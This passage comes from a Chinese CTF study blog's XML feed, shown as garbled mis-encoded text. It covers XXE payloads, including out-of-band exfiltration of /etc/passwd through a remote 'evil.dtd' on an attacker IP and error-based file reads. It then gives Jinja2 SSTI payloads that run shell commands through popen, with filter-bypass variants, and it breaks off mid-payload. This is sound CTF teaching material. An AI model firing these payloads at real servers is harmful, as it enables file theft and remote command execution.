file</code></strong>ï¼šè¿™æ˜¯ä¸€ä¸ª<strong>å‚æ•°å®ä½“</strong>ï¼Œå®ƒä¹Ÿä¼šå»è¯»å–<code>/etc/passwd</code>æ–‡ä»¶</p><p><strong><code>% eval</code></strong>ï¼šè¿™æ˜¯å¦ä¸€ä¸ªå‚æ•°å®ä½“ï¼Œå®ƒçš„å€¼æ˜¯ä¸€ä¸ªå®šä¹‰äº†æ–°å®ä½“ <code>% exfil</code> çš„XMLè¯­å¥ã€‚è¿™ä¸ª<code>% exfil</code>å®ä½“çš„ä½œç”¨ï¼Œæ˜¯å‘æ”»å‡»è€…æœåŠ¡å™¨çš„8080ç«¯å£å‘èµ·ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œå¹¶å°†<code>%file</code>å®ä½“çš„å†…å®¹ï¼ˆå³æ–‡ä»¶å†…å®¹ï¼‰ä½œä¸ºURLå‚æ•°<code>file</code>çš„å€¼</p><p><strong><code>%eval</code> å’Œ <code>%exfil</code></strong>ï¼šè¿™ä¸¤ä¸ªæ˜¯å‚æ•°å®ä½“å¼•ç”¨ï¼Œå®ƒä»¬ä¼šä¾æ¬¡æ‰§è¡Œï¼Œè§¦å‘æ•´ä¸ªæ•°æ®å¤–å¸¦è¿‡ç¨‹</p><p><strong>æäº¤ç»™ç›®æ ‡ç½‘ç«™çš„Payload</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://123.45.67.89/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>test<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong><code>% xxe</code></strong>ï¼šè¿™ä¸ªå‚æ•°å®ä½“ä¼šå»åŠ è½½è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„<code>evil.dtd</code>æ–‡ä»¶</p><p><strong><code>%xxeï¼›</code></strong>ï¼šå¼•ç”¨æ­¤å®ä½“ï¼Œæ„å‘³ç€æœåŠ¡å™¨ä¼šæ‰§è¡Œ<code>evil.dtd</code>ä¸­å®šä¹‰çš„æ‰€æœ‰æ“ä½œ</p><br/><h3 id="åŸºäºé”™è¯¯çš„æ–‡ä»¶è¯»å–"><a href="#åŸºäºé”™è¯¯çš„æ–‡ä»¶è¯»å–" class="headerlink" title="åŸºäºé”™è¯¯çš„æ–‡ä»¶è¯»å–"></a>åŸºäºé”™è¯¯çš„æ–‡ä»¶è¯»å–</h3><p>å½“ç›®æ ‡æœåŠ¡å™¨ä¸æä¾›å›æ˜¾ï¼Œä½†ä¼šè¿”å›è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç§æ–¹æ³•ï¼Œé€šè¿‡é”™è¯¯æ¥è®©æ–‡ä»¶å†…å®¹åœ¨é”™è¯¯ä¿¡æ¯ä¸­æ˜¾ç¤ºå‡ºæ¥ï¼Œä¸€ä¸ªå…¸å‹çš„åˆ©ç”¨Payloadå¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%eval;</span></span><br><span class="line"><span class="meta">%error;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>trigger<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong><code>% file</code></strong>ï¼šå‚æ•°å®ä½“ï¼Œè¯»å–ç›®æ ‡æ–‡ä»¶</p><p><strong><code>% eval</code></strong>ï¼šå‚æ•°å®ä½“ï¼Œå®ƒçš„å€¼å®šä¹‰äº†ä¸€ä¸ªæ–°çš„å‚æ•°å®ä½“ <code>% error</code>ã€‚è¿™ä¸ª<code>% error</code>å®ä½“è¯•å›¾åŠ è½½ä¸€ä¸ªè·¯å¾„ä¸º<code>file:///nonexistent/æ–‡ä»¶å†…å®¹</code>çš„æ–‡ä»¶</p><p><strong><code>%eval;</code> å’Œ <code>%error;</code></strong>ï¼šå½“è§£æå™¨ä¾æ¬¡å¤„ç†è¿™äº›å‚æ•°å®ä½“æ—¶ï¼Œå®ƒä¼šå°è¯•å»è®¿é—®ä¸€ä¸ªè·¯å¾„ä¸º<code>/nonexistent/</code>åŠ ä¸Š<code>/etc/passwd</code>æ–‡ä»¶å†…å®¹çš„â€æ–‡ä»¶â€ã€‚è¿™æ ·çš„è·¯å¾„æ˜¾ç„¶ä¸å­˜åœ¨ï¼Œä»è€Œä¼šè§¦å‘ä¸€ä¸ªé”™è¯¯ï¼ˆå¦‚<code>FileNotFoundException</code>ï¼‰ã€‚è€Œæ–‡ä»¶å†…å®¹ï¼Œå› ä¸ºè¢«ä½œä¸ºè·¯å¾„çš„ä¸€éƒ¨åˆ†ï¼Œå°±æœ‰å¯èƒ½åŒ…å«åœ¨é”™è¯¯ä¿¡æ¯ä¸­è¿”å›ç»™æˆ‘ä»¬</p><p>è¿™ç§æ–¹æ³•é«˜åº¦ä¾èµ–äºæœåŠ¡å™¨é…ç½®ï¼Œéœ€è¦å…¶å¼€å¯è¯¦ç»†çš„é”™è¯¯å›æ˜¾</p><br/><h3 id="Moe-2025-ç¬¬åç« -å¤©æœºç¬¦é˜µ"><a href="#Moe-2025-ç¬¬åç« -å¤©æœºç¬¦é˜µ" class="headerlink" title="[Moe 2025]ç¬¬åç«  å¤©æœºç¬¦é˜µ"></a>[Moe 2025]ç¬¬åç«  å¤©æœºç¬¦é˜µ</h3><blockquote><p>çœæµï¼šflagåœ¨flag.txté‡Œ</p></blockquote><p>æ³¨æ„å›æ˜¾åœ¨<code>è¾“å‡º</code>æ ‡ç­¾é‡Œé¢</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///var/www/html/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">è¾“å‡º</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">è¾“å‡º</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><br/><h3 id="æå®¢å¤§æŒ‘æˆ˜2025-Image-Viewer"><a href="#æå®¢å¤§æŒ‘æˆ˜2025-Image-Viewer" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜2025]Image Viewer"></a>[æå®¢å¤§æŒ‘æˆ˜2025]Image Viewer</h3><blockquote><p>å®‰å…¨çš„åœ¨çº¿å›¾ç‰‡é¢„è§ˆç½‘ç«™</p></blockquote><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªå›¾ç‰‡é¢„è§ˆæ¥å£ï¼Œå¯ä»¥ä¸Šä¼ svgæ ¼å¼ï¼Œå¯ä»¥ç›´æ¥æ“XXE</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;100&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°flag</p><p><img src="/img/post/xxe0.png" alt="flag"></p><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥(SSTI)</title>
      <link href="/2025/11/26/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(SSTI)/"/>
      <url>/2025/11/26/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(SSTI)/</url>
      
        <content type="html"><![CDATA[<h1 id="æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥-SSTI"><a href="#æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥-SSTI" class="headerlink" title="æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥(SSTI)"></a>æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥(SSTI)</h1><p><strong>SSTIï¼ˆServer-Side Template Injectionï¼‰</strong> æ˜¯ä¸€ç§å‘ç”Ÿåœ¨ <strong>æœåŠ¡ç«¯</strong> çš„ä»£ç æ³¨å…¥æ”»å‡»</p><p><strong>æ¨¡æ¿</strong>ï¼šåœ¨ Web å¼€å‘ä¸­ï¼Œæ¨¡æ¿æ˜¯ä¸€ç§æ–‡ä»¶ï¼ˆå¦‚ HTMLï¼‰ï¼Œå®ƒåŒ…å«å›ºå®šçš„éƒ¨åˆ†ï¼ˆå¦‚é¡µé¢å¸ƒå±€ï¼‰å’ŒåŠ¨æ€çš„â€œå ä½ç¬¦â€ã€‚è¿™äº›å ä½ç¬¦ä¼šåœ¨æœåŠ¡å™¨ç«¯è¢«çœŸå®çš„æ•°æ®æ›¿æ¢ï¼Œä»è€Œç”Ÿæˆæœ€ç»ˆçš„ HTML é¡µé¢å‘é€ç»™ç”¨æˆ·</p><p><strong>æ¨¡æ¿å¼•æ“</strong>ï¼šæ˜¯ç”¨äºå¤„ç†æ¨¡æ¿çš„ç¨‹åºã€‚å®ƒæ¥æ”¶æ¨¡æ¿æ–‡ä»¶å’Œæ•°æ®ï¼Œç„¶åå°†æ•°æ®å¡«å……åˆ°æ¨¡æ¿çš„å ä½ç¬¦ä¸­ï¼Œç”Ÿæˆæœ€ç»ˆçš„ HTML</p><p>å½“ä¸€ä¸ªåº”ç”¨ç¨‹åºå°† ç”¨æˆ·è¾“å…¥ ç›´æ¥æ‹¼æ¥åˆ°äº†æ¨¡æ¿ä¸­ï¼Œå¹¶ä¸”æ²¡æœ‰è¿›è¡Œé€‚å½“çš„è¿‡æ»¤å¤„ç†æ—¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥è¾“å…¥ä¸€æ®µæ¶æ„çš„æ¨¡æ¿ä»£ç ã€‚æœåŠ¡å™¨åœ¨æ¸²æŸ“æ¨¡æ¿æ—¶ï¼Œä¼šå°†è¿™äº›æ¶æ„ä»£ç å½“ä½œæ¨¡æ¿æŒ‡ä»¤æ¥æ‰§è¡Œ</p><br/><h2 id="Jinja2æ¨¡æ¿å¼•æ“-Python-æ³¨å…¥"><a href="#Jinja2æ¨¡æ¿å¼•æ“-Python-æ³¨å…¥" class="headerlink" title="Jinja2æ¨¡æ¿å¼•æ“(Python)æ³¨å…¥"></a>Jinja2æ¨¡æ¿å¼•æ“(Python)æ³¨å…¥</h2><p>ç›®å‰æˆ‘é‡åˆ°çš„æå¤§å¤šæ•°é¢˜ç›®éƒ½æ˜¯pythonçš„åç«¯jinja2å¼•æ“æ¸²æŸ“çš„</p><h3 id="å®ç°åŸç†"><a href="#å®ç°åŸç†" class="headerlink" title="å®ç°åŸç†"></a>å®ç°åŸç†</h3><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªæœ€ç®€å•çš„æ³¨å…¥payloadï¼Œå®ƒæ‰§è¡Œçš„å‘½ä»¤è¯»å–äº†<code>/app/flag</code>æ–‡ä»¶å¹¶è¿”å›åœ¨é¡µé¢ä¸­</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">&quot;popen&quot;</span>](<span class="string">&#x27;cat /app/flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>.__class__</code>æ˜¯ä¸€ä¸ªå±æ€§ï¼Œå®ƒå±äº Python ä¸­æ¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå±æ€§çš„ä½œç”¨æ˜¯ï¼šè¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»ã€‚åœ¨è¿™é‡Œï¼Œå®ƒè¿”å›çš„æ˜¯<code>&#39;&#39;</code>è¿™ä¸ªç©ºå­—ç¬¦æ‰€å±çš„ç±»ï¼Œå¦‚æœå•ç‹¬æ‰§è¡Œï¼Œé¡µé¢ä¼šè¿”å›<code>&lt;class &#39;str&#39;&gt;</code>ï¼Œè¯´æ˜å®ƒå±äº<code>str</code>ç±»</p><p><code>.__base__</code> æ˜¯ä¸€ä¸ªå±æ€§ï¼Œå®ƒå±äºä¸€ä¸ªç±»ï¼ˆæ³¨æ„ï¼Œæ˜¯ç±»ï¼Œä¸æ˜¯å¯¹è±¡ï¼‰ï¼Œè¿™ä¸ªå±æ€§çš„ä½œç”¨æ˜¯ï¼šè¿”å›è¯¥ç±»ç›´æ¥ç»§æ‰¿çš„çˆ¶ç±»ã€‚è¿™é‡Œå°±æ˜¯è¿”å›<code>&lt;class &#39;str&#39;&gt;</code>çš„çˆ¶ç±»ï¼Œå•ç‹¬æ‰§è¡Œä¼šè¿”å›<code>&lt;class &#39;object&#39;&gt;</code>ï¼Œè¯´æ˜<code>&lt;class &#39;str&#39;&gt;</code>ç»§æ‰¿äº<code>&lt;class &#39;object&#39;&gt;</code></p><p><code>.__subclasses__[133]</code> æ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºè·å–æŸä¸ªç±»çš„æ‰€æœ‰ç›´æ¥å­ç±»ï¼Œå®ƒè¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼ŒåŒ…å«æ‰€æœ‰ç»§æ‰¿è‡ªè¯¥ç±»çš„å­ç±»å¯¹è±¡ï¼Œåé¢çš„[133]è¡¨ç¤ºè®¿é—®ç¬¬134ä¸ªå¯¹åº”çš„å­ç±»ï¼Œé¢˜ç›®ç¯å¢ƒä¸­å•ç‹¬æ‰§è¡Œä¼šè¿”å›<code>&lt;class &#39;os._wrap_close&#39;&gt;</code></p><blockquote><p><code>&lt;class &#39;os._wrap_close&#39;&gt;</code>ç±»çš„æ„ä¹‰æ˜¯ä½œä¸ºè®¿é—®ç³»ç»Ÿçº§åŠŸèƒ½çš„è·³æ¿å’Œæ¡¥æ¢ï¼Œè·å–æ‰€æœ‰ os æ¨¡å—çš„å‡½æ•°</p></blockquote><p><code>.__init__</code>è¿™ä¸€éƒ¨åˆ†é€šè¿‡å±æ€§è®¿é—®çš„æ–¹å¼è·å–äº†ä¸€ä¸ªå‡½æ•°å¯¹è±¡ä¹Ÿå°±æ˜¯<code>.__init__</code>æœ¬èº«ï¼Œè¿™ä¸€æ­¥æ˜¯ä¸ºæ»¡è¶³<code>.__globals__</code>çš„è®¿é—®æ¡ä»¶ï¼ˆåªæœ‰å‡½æ•°å¯¹è±¡æ‰æœ‰ <code>__globals__</code> å±æ€§ï¼‰ï¼Œå•ç‹¬è®¿é—®çš„å›æ˜¾æ˜¯<code>&lt;function _wrap_close.__init__ at 0x7f32e4975af0&gt;</code>ï¼Œè¯´æ˜å·²ç»æˆåŠŸè®¿é—®åˆ°äº†ï¼Œå†…å­˜åœ°å€æ˜¯<code>0x7f32e4975af0</code></p><p><code>.__globals__</code>æ˜¯åœ¨è®¿é—®è¿™ä¸ªå‡½æ•°å¯¹è±¡çš„globalså±æ€§ï¼Œè¿™åŸºæœ¬ä¸Šç›¸å½“äºè·å¾—äº†æ•´ä¸ª <code>os</code> æ¨¡å—çš„å®Œæ•´è®¿é—®æƒé™ï¼Œå•ç‹¬ä½¿ç”¨è·å¾—ä¼šè·å¾—ä¸€ä¸ªåºå¤§çš„å­—å…¸</p><p><code>[&#39;popen&#39;]</code>æ˜¯åœ¨é€šè¿‡é”®åç´¢å¼•è·å–è¿™ä¸ªå‡½æ•°ï¼Œå•ç‹¬ä½¿ç”¨è¿”å›<code>&lt;function popen at 0x7f3d170639d0&gt;</code>ä»£è¡¨æˆåŠŸè·å–<code>(&#39;cat /flag&#39;)</code>åˆ™æ˜¯æˆ‘ä»¬è¯»å–flagçš„å‘½ä»¤ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªç±»æ–‡ä»¶å¯¹è±¡ï¼Œæ¯”å¦‚æ­¤å¤„è¾“å‡ºåº”è¯¥æ˜¯<code>&lt;os._wrap_close object at 0x7f3d15552430&gt;</code></p><p><code>.read()</code>æ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºä»æ–‡ä»¶å¯¹è±¡æˆ–ç±»æ–‡ä»¶å¯¹è±¡ä¸­è¯»å–æ•°æ®ï¼Œæ­¤å¤„ç”¨äºè¯»å–å‘½ä»¤çš„è¾“å‡ºï¼Œè¿”å›<code>flag&#123;Â·Â·Â·Â·Â·Â·&#125;</code>ï¼Œæ­¤æ—¶ä¾¿å®Œæˆäº†SSTIæ³¨å…¥çš„æ•´ä¸€ä¸ªæµç¨‹</p><br/><p>ç±»ä¼¼çš„ï¼Œä»¥ä¸‹payloadä¹Ÿå¯èƒ½å®ç°ä¸€å®šåŠŸèƒ½</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[X].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125; //åˆ©ç”¨__builtins__å‡½æ•°å­—å…¸ä¸­çš„<span class="built_in">eval</span>å‡½æ•°æ‰§è¡Œpythonä»£ç </span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[X].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()&#125;&#125; //ç›´æ¥è°ƒç”¨osæ¨¡å—</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].os.popen(<span class="string">&#x27;ls /&#x27;</span>).read()&#125;&#125; //å€Ÿç”¨linecacheæ¨¡å—é—´æ¥è°ƒç”¨osæ¨¡å—</span><br></pre></td></tr></table></figure><br/><h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><blockquote><p>çœŸæ­£åšé¢˜å“ªæœ‰é‚£ä¹ˆå®¹æ˜“ï¼Œå‡ºé¢˜äººä¼šè®¾ç½®å„ç§å„æ ·çš„wafåˆéš¾ä½ </p></blockquote><h4 id="è¿‡æ»¤å™¨"><a href="#è¿‡æ»¤å™¨" class="headerlink" title="è¿‡æ»¤å™¨"></a>è¿‡æ»¤å™¨</h4><table><thead><tr><th>è¿‡æ»¤å™¨å‡½æ•°</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td><code>length()</code></td><td>è·å–ä¸€ä¸ªåºåˆ—æˆ–å­—å…¸çš„é•¿åº¦å¹¶å°†å…¶è¿”å›</td></tr><tr><td><code>int()</code></td><td>å°†å€¼è½¬æ¢æˆintç±»å‹</td></tr><tr><td><code>float()</code></td><td>å°†å€¼è½¬æ¢æˆfloatç±»å‹</td></tr><tr><td><code>lower()</code></td><td>å°†å­—ç¬¦ä¸²è½¬æ¢æˆå°å†™</td></tr><tr><td><code>upper()</code></td><td>å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™</td></tr><tr><td><code>reverse()</code></td><td>åè½¬å­—ç¬¦ä¸²</td></tr><tr><td><code>replace(value,old,new)</code></td><td>å°†valueä¸­çš„oldæ›¿æ¢ä¸ºnew</td></tr><tr><td><code>list()</code></td><td>å°†å˜é‡è½¬æ¢æˆåˆ—è¡¨ç±»å‹</td></tr><tr><td><code>string()</code></td><td>å°†å˜é‡ï¼ˆé”®å€¼ï¼‰è½¬æ¢æˆå­—ç¬¦ä¸²ç±»å‹</td></tr><tr><td><code>join()</code></td><td>å°†ä¸€ä¸ªåºåˆ—ä¸­çš„é”®æ‹¼æ¥æˆå­—ç¬¦ä¸²ï¼Œé€šå¸¸æœ‰pythonå†…ç½®çš„<code>dict()</code>é…åˆä½¿ç”¨</td></tr><tr><td><code>attr()</code></td><td>è·å–å¯¹è±¡çš„å±æ€§</td></tr></tbody></table><br/><h4 id="è¿‡æ»¤åŒèŠ±æ‹¬å·"><a href="#è¿‡æ»¤åŒèŠ±æ‹¬å·" class="headerlink" title="è¿‡æ»¤åŒèŠ±æ‹¬å·"></a>è¿‡æ»¤åŒèŠ±æ‹¬å·</h4><p>ä»¥ä¸‹å¤§é‡å€Ÿé‰´<a href="https://blog.csdn.net/m0_73185293/article/details/131695528">SSTIæ¼æ´åˆ©ç”¨åŠç»•è¿‡æ€»ç»“(ç»•è¿‡å§¿åŠ¿å¤šæ ·)</a></p><p>å¯å°†<code>&#123;&#123; &#125;&#125;</code>ä½¿ç”¨<code>&#123;% %&#125;</code>ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[X].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read()) %&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>&#123;&#123; &#125;&#125;</code>ï¼šç”¨äºè¾“å‡ºè¡¨è¾¾å¼çš„ç»“æœ<br><code>&#123;% %&#125;</code>ï¼šç”¨äºæ‰§è¡Œè¯­å¥å’Œæ§åˆ¶æµç¨‹</p></blockquote><h4 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤[ ]"></a>è¿‡æ»¤<code>[ ]</code></h4><p>é­”æœ¯æ–¹æ³•<code>__getitem__</code>å¯ä»£æ›¿ä¸­æ‹¬å·</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(X).__getitem__(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat /flag&#x27;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="è¿‡æ»¤-ã€"><a href="#è¿‡æ»¤-ã€" class="headerlink" title="è¿‡æ»¤&#39;&#39;ã€&quot;&quot;"></a>è¿‡æ»¤<code>&#39;&#39;</code>ã€<code>&quot;&quot;</code></h4><p>å½“å•åŒå¼•å·è¢«è¿‡æ»¤åï¼Œå¯ä»¥ä½¿ç”¨getæˆ–è€…postä¼ å‚è¾“å…¥éœ€è¦å¸¦å¼•å·çš„å†…å®¹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__base__.__subclasses__()[X].__init__.__globals__[request.args.popen](request.args.cmd).read() &#125;&#125;</span><br><span class="line">åŒæ—¶getä¼ å‚?popen=popen&amp;cmd=cat /flag</span><br><span class="line">&#123;&#123; ().__class__.__base__.__subclasses__()[X].__init__.__globals__[request.form.popen](request.form.cmd).read() &#125;&#125;</span><br><span class="line">åŒæ—¶postä¼ å‚?popen=popen&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å¯¹globalså­—å…¸æ„é€ ï¼ˆå‡ ä¹æ‰€æœ‰çš„ç¬¦å·éƒ½å¯ä»¥æ‰¾åˆ°ï¼‰</p><h4 id="è¿‡æ»¤-1"><a href="#è¿‡æ»¤-1" class="headerlink" title="è¿‡æ»¤_"></a>è¿‡æ»¤<code>_</code></h4><p>å½“ä¸‹åˆ’çº¿è¢«è¿‡æ»¤åï¼Œå¯ä»¥ä½¿ç”¨è¿‡æ»¤å™¨è¾“å…¥ä¸‹åˆ’çº¿</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(X) %&#125; //åœ¨åˆ—è¡¨ä¸­é€‰ä¸­<span class="string">&#x27;_&#x27;</span>å³å¯</span><br></pre></td></tr></table></figure><p>æˆ–è€…åˆ†å¼€ä¼ å‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ()|attr(request.form.p1)|attr(request.form.p2)|attr(request.form.p3)()|attr(request.form.p4)(X)|attr(request.form.p5)|attr(request.form.p6)|attr(request.form.p7)(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat /flag&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)() &#125;&#125;</span><br><span class="line">åŒæ—¶postä¼ å‚p1=__class__&amp;p2=__base__&amp;p3=__subclasses__&amp;p4=__getitem__&amp;p5=__init__&amp;p6=__globals__&amp;p7=__getitem__</span><br></pre></td></tr></table></figure><p>æˆ–è€…è¿›è¡Œ16ä½ç¼–ç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ()[<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fbase\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;</span>]()[X][<span class="string">&#x27;\x5f\x5finit\x5f\x5f&#x27;</span>][<span class="string">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="è¿‡æ»¤-2"><a href="#è¿‡æ»¤-2" class="headerlink" title="è¿‡æ»¤."></a>è¿‡æ»¤<code>.</code></h4><p>ä½¿ç”¨ä¸­æ‹¬å·ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ()[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__base__&#x27;</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()[X][<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]() &#125;&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä½¿ç”¨è¿‡æ»¤å™¨arrt()å‡½æ•°ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ()|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(X)|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;popen&#x27;</span>)(<span class="string">&#x27;cat /flag&#x27;</span>)|attr(<span class="string">&#x27;read&#x27;</span>)() &#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="è¿‡æ»¤å…³é”®å­—"><a href="#è¿‡æ»¤å…³é”®å­—" class="headerlink" title="è¿‡æ»¤å…³é”®å­—"></a>è¿‡æ»¤å…³é”®å­—</h4><p>+å·æ‹¼æ¥ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ()[<span 